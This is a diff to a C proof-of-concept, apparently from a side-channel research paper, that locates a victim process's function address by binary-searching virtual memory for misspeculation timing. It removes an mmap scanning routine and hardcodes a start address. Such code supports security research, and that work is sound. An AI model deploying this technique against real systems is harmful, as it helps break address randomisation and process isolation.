@@ -106,7 +106,7 @@ int doSearch(ADDR_PTR low, ADDR_PTR high) {
 	}
 
 	int result = checkForMisspeculation();
-	printf("low: %p, high: %p, diff: %lu time:%i\n", low, high, difference, result);
+	// printf("low: %p, high: %p, diff: %lu time:%i\n", low, high, difference, result);
 
 	// Zero the memory to prepare for the next check.
 	memset((void *)low, 0, difference);
@@ -117,12 +117,13 @@ int doSearch(ADDR_PTR low, ADDR_PTR high) {
 // Given a range of virtual addresses, perform a recursive search to determine
 // which address is being speculatively accessed.
 ADDR_PTR search(ADDR_PTR low, ADDR_PTR high) {
+	printf("Victim function between %p and %p.\n", (void *)low, (void *)high);
 	ADDR_PTR midpoint = (low + high) / 2;
 	size_t difference = (ADDR_PTR)high - (ADDR_PTR)low;
 
 	// When we've narrowed it down to a 64 byte range, print the results. This is our answer!
 	if (difference <= 64) {
-		printf("Victim function is between virtual addresses %p and %p.\n", (void *)low, (void *)high);
+		// printf("Victim function is between virtual addresses %p and %p.\n", (void *)low, (void *)high);
 		return doSearch(low, high);
 	}
 
@@ -145,39 +146,6 @@ ADDR_PTR search(ADDR_PTR low, ADDR_PTR high) {
 
 void lastFunction();
 
-void* getMmapSpace() {
-	void *startAddr, *endAddr, *bestStartAddr;
-	int time, bestTime = 1000;
-
-	// Ideally we would start searching from the end of Attacker's code segment.
-	// This causes segfaults, as discussed in our paper.
-	startAddr = (void *)(ADDR_PTR(&lastFunction) + (1<<13));
-	// startAddr = (void *)0x5572e3000000;
-
-	// Find the chunk which aligns with the victim's function call. 
-	for (int i = 0; i < 1000; i++) {
-		startAddr = largeMap(startAddr);
-		endAddr = getEndAddr(startAddr);
-
-		time = doSearch((ADDR_PTR)startAddr, (ADDR_PTR)endAddr);
-
-		if (time < bestTime) {
-			bestTime = time;
-			bestStartAddr = startAddr;
-			printf("new best: %p, %i\n", startAddr, time);
-		}
-
-		unmap(startAddr);
-		startAddr = endAddr;
-
-		if (useFirstMmap) {
-			break;
-		}
-	}
-
-	return bestStartAddr;
-}
-
 int main(int argc, char *argv[]){
 	void *startAddr, *endAddr;
 
@@ -185,16 +153,11 @@ int main(int argc, char *argv[]){
 	// Memory load occurs 4 bytes after the function pointer.
 	loadMemoryPtr = (void *)((ADDR_PTR)&loadMemory+4);
 
-	// Certain regions of memory are already mmapped by libraries or the kernel.
-	// Attempting to re-allocate results in a segfault.
-	// Allocate memory in small chunks to avoid this. Each chunk is 2^22 bytes = 4MB.
-	startAddr = getMmapSpace();
+	startAddr = (void *)0x564020000000;
 	endAddr = getEndAddr(startAddr);
-
-	printf("Intermediate result: victim virtual address is between %p and %p.\n", startAddr, endAddr);
-
-	// Once we've identified the 4MB chunk, use a binary search to find the specific alignment.
 	largeMap(startAddr);
+
+	// Use a binary search to find the specific alignment.
 	search(ADDR_PTR(startAddr), ADDR_PTR(endAddr));
 
 	return 0;
